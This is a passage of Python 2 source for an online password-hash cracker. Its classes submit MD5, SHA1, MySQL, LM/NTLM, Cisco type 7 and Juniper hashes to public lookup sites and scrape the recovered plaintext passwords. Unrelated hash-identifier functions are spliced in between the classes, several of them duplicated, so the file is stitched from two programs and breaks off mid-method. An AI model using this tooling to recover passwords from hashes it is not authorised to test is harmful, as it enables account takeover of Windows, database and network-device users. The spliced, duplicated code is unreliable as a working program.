		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5crack.com/crackmd5.php"
		
		
		params = { "term" : hashvalue,
			   "crackbtn" : "Crack that hash baby!" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'Found: md5\("[^"]+"\)', html)
		
		if match:
			return match.group().split('"')[1]
		else:
			return None


class MD5ONLINE:
	
	name = 		"md5online"
	url = 		"http://md5online.net"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = self.url
		
		
		params = { "pass" : hashvalue,
			   "option" : "hash2text",
			   "send" : "Submit" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<center><p>md5 :<b>\w*</b> <br>pass : <b>[^<]*</b></p></table>', html)
		
		if match:
			return match.group().split('b>')[3][:-2]
		else:
			return None




class MD5_DECRYPTER:
	
	name = 		"md5-decrypter"
	url = 		"http://md5-decrypter.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = self.url
		
		
		params = { "data[Row][cripted]" : hashvalue }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = findall (r'<b class="res">[^<]*</b>', html)
		
		if match:
			return match[1].split('>')[1][:-3]
		else:
			return None



class AUTHSECUMD5:
	
	name = 		"authsecu"
	url = 		"http://www.authsecu.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php"
		
		
		params = { "valeur_bouton" : "dechiffrage",
			   "champ1" : "",
			   "champ2" : hashvalue,
			   "dechiffrer.x" : "78",
			   "dechiffrer.y" : "7" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = findall (r'<td><p class="chapitre---texte-du-tableau-de-niveau-1">[^<]*</p></td>', html)
		
		if len(match) > 2:
			return match[1].split('>')[2][:-3]
		else:
			return None



class HASHCRACK:
	
	name = 		"hashcrack"
	url = 		"http://hashcrack.com"
	supported_algorithm = [MD5, SHA1, MYSQL, LM, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://hashcrack.com/indx.php"
		
		hash2 = None
		if alg in [LM, NTLM] and ':' in hashvalue:
			if alg == LM:
				hash2 = hashvalue.split(':')[0]
			else:
				hash2 = hashvalue.split(':')[1]
		else:
			hash2 = hashvalue
		
		# Delete the possible starting '*'
		if alg == MYSQL and hash2[0] == '*':
			hash2 = hash2[1:]
		
		
		params = { "auth" : "8272hgt",
			   "hash" : hash2,
			   "string" : "",
			   "Submit" : "Submit" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<div align=center>"[^"]*" resolves to</div><br><div align=center> <span class=hervorheb2>[^<]*</span></div></TD>', html)
		
		if match:
			return match.group().split('hervorheb2>')[1][:-18]
		else:
			return None



class OPHCRACK:
	
	name = 		"ophcrack"
	url = 		"http://www.objectif-securite.ch"
	supported_algorithm = [LM, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		if ':' not in hashvalue:
			return None
			
		if hashvalue.split(':')[0] == "aad3b435b51404eeaad3b435b51404ee":
			return None
		
		
		url = "http://www.objectif-securite.ch/en/products.php?hash=%s" % (hashvalue.replace(':', '%3A'))
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<table><tr><td>Hash:</td><td>[^<]*</td></tr><tr><td><b>Password:</b></td><td><b>[^<]*</b></td>', html)
		
		if match:
			return match.group().split('b>')[3][:-2]
		else:
			return None
	


	

def SHA256s():
    hs='$6$g4TpUQzk$OmsZBJFwvy6MwZckPvVYfDnwsgktm2CckOlNJGy9HNwHSuHFvywGIuwkJ6Bjn3kKbB6zoyEjIYNMpHWBNxJ6g.'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$6$')==0:
        jerar.append("120020")

def SHA384Django():
    hs='sha384$Zion3R$88cfd5bc332a4af9f09aa33a1593f24eddc01de00b84395765193c3887f4deac46dc723ac14ddeb4d3a9b958816b7bba'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha384')==0:
        print " [+] SHA-384(Django)"
        jerar.append("121020")

def SHA512():
    hs='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122020")
def SHA512HMAC():
    hs='dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122060")
def Whirlpool():
    hs='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122040")
def WhirlpoolHMAC():
    hs='77996016cf6111e97d6ad31484bab1bf7de7b7ee64aebbc243e650a75a2f9256cef104e504d3cf29405888fca5a231fcac85d36cd614b1d52fce850b53ddf7f9'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122080")

class C0LLISION:
	
	name = 		"c0llision"
	url = 		"http://www.c0llision.net"
	supported_algorithm = [MD5, LM, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		if alg in [LM, NTLM] and ':' not in hashvalue:
			return None
			
		response = do_HTTP_request ( "http://www.c0llision.net/webcrack.php" )
		html = None
		if response:
			html = response.read()
		else:
			return None
		match = search (r'<input type="hidden" name="hash._csrf_token." value="[^"]*" id="hash__csrf_token" />', html)
		token = None
		if match:
			token = match.group().split('"')[5]
		
		
		url = "http://www.c0llision.net/webcrack/request"
		
		
		params = { "hash[_input_]" : hashvalue,
			   "hash[_csrf_token]" : token }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = None
		if alg in [LM, NTLM]:
			html = html.replace('\n', '')
			result = ""
			
			match = search (r'<table class="pre">.*?</table>', html)
			if match:
				try:
					doc = parseDoc ( match.group() )
				except:
					print "INFO: You need libxml2 to use this plugin."
					return None
				lines = doc.xpathEval("//tr")
				for l in lines:
					doc = parseDoc ( str(l) )
					cols = doc.xpathEval("//td")
					
					if len(cols) < 4:
						return None
					
					if cols[2].content:
						result = " > %s (%s) = %s\n" % ( cols[1].content, cols[2].content, cols[3].content )
				
				return ( result and result.split()[-1] or None )
			
		else:
			match = search (r'<td class="plaintext">[^<]*</td>', html)
		
			if match:
				return match.group().split('>')[1][:-4]
		
		return None



def SHA384HMAC():
    hs='bef0dd791e814d28b4115eb6924a10beb53da47d463171fe8e63f68207521a4171219bb91d0580bca37b0f96fddeeb8b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("119040")

def SHA256s():
    hs='$6$g4TpUQzk$OmsZBJFwvy6MwZckPvVYfDnwsgktm2CckOlNJGy9HNwHSuHFvywGIuwkJ6Bjn3kKbB6zoyEjIYNMpHWBNxJ6g.'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$6$')==0:
        jerar.append("120020")

def SHA384Django():
    hs='sha384$Zion3R$88cfd5bc332a4af9f09aa33a1593f24eddc01de00b84395765193c3887f4deac46dc723ac14ddeb4d3a9b958816b7bba'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha384')==0:
        print " [+] SHA-384(Django)"
        jerar.append("121020")

def SHA512():
    hs='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122020")
def SHA512HMAC():
    hs='dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122060")
def Whirlpool():
    hs='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122040")
def WhirlpoolHMAC():
    hs='77996016cf6111e97d6ad31484bab1bf7de7b7ee64aebbc243e650a75a2f9256cef104e504d3cf29405888fca5a231fcac85d36cd614b1d52fce850b53ddf7f9'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("122080")

class REDNOIZE:
	
	name = 		"rednoize"
	url = 		"http://md5.rednoize.com"
	supported_algorithm = [MD5, SHA1]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = ""
		if alg == MD5:
			url = "http://md5.rednoize.com/?p&s=md5&q=%s&_=" % (hashvalue)
		else:
			url = "http://md5.rednoize.com/?p&s=sha1&q=%s&_=" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		return html
			
			


class CMD5:
	
	name = 		"cmd5"
	url = 		"http://www.cmd5.org"
	supported_algorithm = [MD5, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		response = do_HTTP_request ( "http://www.cmd5.org/" )
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="[^"]*" />', html)
		viewstate = None
		if match:
			viewstate = match.group().split('"')[7]
		
		match = search (r'<input type="hidden" name="ctl00.ContentPlaceHolder1.HiddenField1" id="ctl00_ContentPlaceHolder1_HiddenField1" value="[^"]*" />', html)
		ContentPlaceHolder1 = ""
		if match:
			ContentPlaceHolder1 = match.group().split('"')[7]
		
		match = search (r'<input type="hidden" name="ctl00.ContentPlaceHolder1.HiddenField2" id="ctl00_ContentPlaceHolder1_HiddenField2" value="[^"]*" />', html)
		ContentPlaceHolder2 = ""
		if match:
			ContentPlaceHolder2 = match.group().split('"')[7]
		
		
		url = "http://www.cmd5.org/"
		
		hash2 = ""
		if alg == MD5:
			hash2 = hashvalue
		else:
			if ':' in hashvalue:
				hash2 = hashvalue.split(':')[1]
		
		
		params = { "__EVENTTARGET" : "",
			   "__EVENTARGUMENT" : "",
			   "__VIEWSTATE" : viewstate,
			   "ctl00$ContentPlaceHolder1$TextBoxq" : hash2,
			   "ctl00$ContentPlaceHolder1$InputHashType" : alg,
			   "ctl00$ContentPlaceHolder1$Button1" : "decrypt",
			   "ctl00$ContentPlaceHolder1$HiddenField1" : ContentPlaceHolder1,
			   "ctl00$ContentPlaceHolder1$HiddenField2" : ContentPlaceHolder2 }
			   
		header = { "Referer" : "http://www.cmd5.org/" }
		
		
		response = do_HTTP_request ( url, params, header )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<span id="ctl00_ContentPlaceHolder1_LabelResult">[^<]*</span>', html)
		
		if match:
			return match.group().split('>')[1][:-6]
		else:
			return None


def SNEFRU256HMAC():
    hs='4e9418436e301a488f675c9508a2d518d8f8f99e966136f2dd7e308b194d74f9'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115180")
def SHA256md5pass():
    hs='b419557099cfa18a86d1d693e2b3b3e979e7a5aba361d9c4ec585a1a70c7bde4'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115200")
def SHA256sha1pass():
    hs='afbed6e0c79338dbfe0000efe6b8e74e3b7121fe73c383ae22f5b505cb39c886'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115220")

def MD5passsaltjoomla2():
    hs='fb33e01e4f8787dc8beb93dac4107209:fxJUXVjYRafVauT77Cze8XwFrWaeAYB2'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
        jerar.append("116020")
def SAM():
    hs='4318B176C3D8E3DEAAD3B435B51404EE:B7C899154197E8A2A33121D76A240AB5'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash.islower()==False and hash[32:33].find(':')==0:
        jerar.append("116040")

def SHA256Django():
    hs='sha256$Zion3R$9e1a08aa28a22dfff722fad7517bae68a55444bb5e2f909d340767cec9acf2c3'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha256')==0:
        jerar.append("117020")

def RipeMD320():
    hs='b4f7c8993a389eac4f421b9b3b2bfb3a241d05949324a8dab1286069a18de69aaf5ecc3c2009d8ef'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("118020")
def RipeMD320HMAC():
    hs='244516688f8ad7dd625836c0d0bfc3a888854f7c0161f01de81351f61e98807dcd55b39ffe5d7a78'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("118040")

class AUTHSECUCISCO7:
	
	name = 		"authsecu"
	url = 		"http://www.authsecu.com"
	supported_algorithm = [CISCO7]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.authsecu.com/decrypter-dechiffrer-cracker-password-cisco-7/script-password-cisco-7-launcher.php"
		
		
		params = { "valeur_bouton" : "dechiffrage",
			   "champ1" : hashvalue,
			   "dechiffrer.x" : 43,
			   "dechiffrer.y" : 16 }
			   
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = findall (r'<td><p class="chapitre---texte-du-tableau-de-niveau-1">[^<]*</p></td>', html)
		
		if match:
			return match[1].split('>')[2][:-3]
		else:
			return None




class CACIN:
	
	name = 		"cacin"
	url = 		"http://cacin.net"
	supported_algorithm = [CISCO7]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://cacin.net/cgi-bin/decrypt-cisco.pl?cisco_hash=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<tr>Cisco password 7: [^<]*</tr><br><tr><th><br>Decrypted password: .*', html)
		
		if match:
			return match.group().split(':')[2][1:]
		else:
			return None


class IBEAST:
	
	name = 		"ibeast"
	url = 		"http://www.ibeast.com"
	supported_algorithm = [CISCO7]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.ibeast.com/content/tools/CiscoPassword/decrypt.php?txtPassword=%s&submit1=Enviar+consulta" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<font size="\+2">Your Password is [^<]*<br>', html)
		
		if match:
			return match.group().split('is ')[1][:-4]
		else:
			return None



def SHA256():
    hs='2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115020")
def SHA256HMAC():
    hs='d3dd251b7668b8b6c12e639c681e88f2c9b81105ef41caccb25fcde7673a1132'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115120")
def Haval256():
    hs='7169ecae19a5cd729f6e9574228b8b3c91699175324e6222dec569d4281d4a4a'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115040")
def Haval256HMAC():
    hs='6aa856a2cfd349fb4ee781749d2d92a1ba2d38866e337a4a1db907654d4d4d7a'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115140")
def GOSTR341194():
    hs='ab709d384cce5fda0793becd3da0cb6a926c86a8f3460efb471adddee1c63793'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115060")
def RipeMD256():
    hs='5fcbe06df20ce8ee16e92542e591bdea706fbdc2442aecbf42c223f4461a12af'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115080")
def RipeMD256HMAC():
    hs='43227322be1b8d743e004c628e0042184f1288f27c13155412f08beeee0e54bf'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115160")
def SNEFRU256():
    hs='3a654de48e8d6b669258b2d33fe6fb179356083eed6ff67e27c5ebfa4d9732bb'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("115100")

def SHA384():
    hs='3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("119020")


class PASSWORD_DECRYPT:
	
	name = 		"password-decrypt"
	url = 		"http://password-decrypt.com"
	supported_algorithm = [CISCO7, JUNIPER]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = ""
		params = None
		if alg == CISCO7:
			url = "http://password-decrypt.com/cisco.cgi"
			params = { "submit" : "Submit",
				"cisco_password" : hashvalue,
				"submit" : "Submit" }
		else:
			url = "http://password-decrypt.com/juniper.cgi"
			params = { "submit" : "Submit",
				"juniper_password" : hashvalue,
				"submit" : "Submit" }
		
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'Decrypted Password:&nbsp;<B>[^<]*</B> </p>', html)
		
		if match:
			return match.group().split('B>')[1][:-2]
		else:
			return None




class BIGTRAPEZE:
	
	name = 		"bigtrapeze"
	url = 		"http://www.bigtrapeze.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.bigtrapeze.com/md5/index.php"
		
		
		params = { "query" : hashvalue,
			   " Crack " : "Enviar consulta" }
			   
		
		headers = { "User-Agent" : USER_AGENTS[randint(0, len(USER_AGENTS))-1] }

		
		response = do_HTTP_request ( url, params, headers )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
			
		match = search (r'Congratulations!<li>The hash <strong>[^<]*</strong> has been deciphered to: <strong>[^<]*</strong></li>', html)
		
		if match:
			return match.group().split('strong>')[3][:-2]
		else:
			return None

def Haval192HMAC():
    hs='39b4d8ecf70534e2fd86bb04a877d01dbf9387e640366029'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("110080")
def Tiger192():
    hs='c086184486ec6388ff81ec9f235287270429b2253b248a70'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("110020")
def Tiger192HMAC():
    hs='8e914bb64353d4d29ab680e693272d0bd38023afa3943a41'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("110060")

def MD5passsaltjoomla1():
    hs='35d1c0d69a2df62be2df13b087343dc9:BeKMviAfcXeTPTlX'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
        jerar.append("112020")

def SHA1Django():
    hs='sha1$Zion3R$299c3d65a0dcab1fc38421783d64d0ecf4113448'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:5].find('sha1$')==0:
        jerar.append("113020")

def Haval224():
    hs='f65d3c0ef6c56f4c74ea884815414c24dbf0195635b550f47eac651a'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("114040")
def Haval224HMAC():
    hs='f10de2518a9f7aed5cf09b455112114d18487f0c894e349c3c76a681'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("114080")
def SHA224():
    hs='e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("114020")
def SHA224HMAC():
    hs='c15ff86a859892b5e95cdfd50af17d05268824a6c9caaa54e4bf1514'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("114060")

class HASHCHECKER:
	
	name = 		"hashchecker"
	url = 		"http://www.hashchecker.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.hashchecker.com/index.php"
		
		
		params = { "search_field" : hashvalue,
			   "Submit" : "search" }
			   
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
			
		match = search (r'<td><li>Your md5 hash is :<br><li>[^\s]* is <b>[^<]*</b> used charlist :2</td>', html)
		
		if match:
			return match.group().split('b>')[1][:-2]
		else:
			return None



class MD5HASHCRACKER:
	
	name = 		"md5hashcracker"
	url = 		"http://md5hashcracker.appspot.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5hashcracker.appspot.com/crack"
		
		
		params = { "query" : hashvalue,
			   "submit" : "Crack" }
		
		response = do_HTTP_request ( url, params )
		
		url = "http://md5hashcracker.appspot.com/status"
		
		response = do_HTTP_request ( url )
		
		
		if response:
			html = response.read()
		else:
			return None
		match = search (r'<td id="cra[^"]*">not cracked</td>', html)
		
		if not match:
			match = search (r'<td id="cra[^"]*">cracked</td>', html)
			regexp = r'<td id="pla_' + match.group().split('"')[1][4:] + '">[^<]*</td>'
			match2 = search (regexp, html)
			if match2:
				return match2.group().split('>')[1][:-4]
			
		else:
			return None



class PASSCRACKING:
	
	name = 		"passcracking"
	url = 		"http://passcracking.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		 
		url = "http://passcracking.com/index.php"
		
		
		boundary = "-----------------------------" + str(randint(1000000000000000000000000000,9999999999999999999999999999))
		params = [ '--' + boundary, 
			   'Content-Disposition: form-data; name="admin"', 
			   '', 
			   'false', 
			   
			   '--' + boundary, 
			   'Content-Disposition: form-data; name="admin2"', 
			   '', 
			   '77.php', 
			   
			   '--' + boundary, 
			   'Content-Disposition: form-data; name="datafromuser"', 
			   '', 
			   '%s' % (hashvalue) , 
			   
			   '--' + boundary + '--', '' ]
		body = '\r\n'.join(params)

		headers = { "Content-Type" : "multipart/form-data; boundary=%s" % (boundary),
		            "Content-length" : len(body) }
		
			   
		
		request = urllib2.Request ( url )
		request.add_header ( "Content-Type", "multipart/form-data; boundary=%s" % (boundary) )
		request.add_header ( "Content-length", len(body) )
		request.add_data(body)
		try:
			response = urllib2.urlopen(request)
		except:
			return None
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
			
		match = search (r'<td>md5 Database</td><td>[^<]*</td><td bgcolor=.FF0000>[^<]*</td>', html)
		
		if match:
			return match.group().split('>')[5][:-4]
		else:
			return None

def sha1usernamepass():
    hs='3de3d8093bf04b8eb5f595bc2da3f37358522c9f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109380")
def sha1usernamepasssalt():
    hs='00025111b3c4d0ac1635558ce2393f77e94770c5'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109400")
def sha1md5pass():
    hs='fa960056c0dea57de94776d3759fb555a15cae87'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("1094202")
def sha1md5passsalt():
    hs='1dad2b71432d83312e61d25aeb627593295bcc9a'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109440")
def sha1md5sha1pass():
    hs='8bceaeed74c17571c15cdb9494e992db3c263695'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109460")
def sha1sha1pass():
    hs='3109b810188fcde0900f9907d2ebcaa10277d10e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109480")
def sha1sha1passsalt():
    hs='780d43fa11693b61875321b6b54905ee488d7760'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109500")
def sha1sha1passsubstrpass03():
    hs='5ed6bc680b59c580db4a38df307bd4621759324e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109520")
def sha1sha1saltpass():
    hs='70506bac605485b4143ca114cbd4a3580d76a413'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109540")
def sha1sha1sha1pass():
    hs='3328ee2a3b4bf41805bd6aab8e894a992fa91549'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109560")
def sha1strtolowerusernamepass():
    hs='79f575543061e158c2da3799f999eb7c95261f07'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109580")

def Haval192():
    hs='cd3a90a3bebd3fa6b6797eba5dab8441f16a7dfa96c6e641'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("110040")

class ASKCHECK:
	
	name = 		"askcheck"
	url = 		"http://askcheck.com"
	supported_algorithm = [MD4, MD5, SHA1, SHA256]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://askcheck.com/reverse?reverse=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
			
		match = search (r'Reverse value of [^\s]* hash <a[^<]*</a> is <a[^>]*>[^<]*</a>', html)
		
		if match:
			return match.group().split('>')[3][:-3]
		else:
			return None



class FOX21:
	
	name = 		"fox21"
	url = 		"http://cracker.fox21.at"
	supported_algorithm = [MD5, LM, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
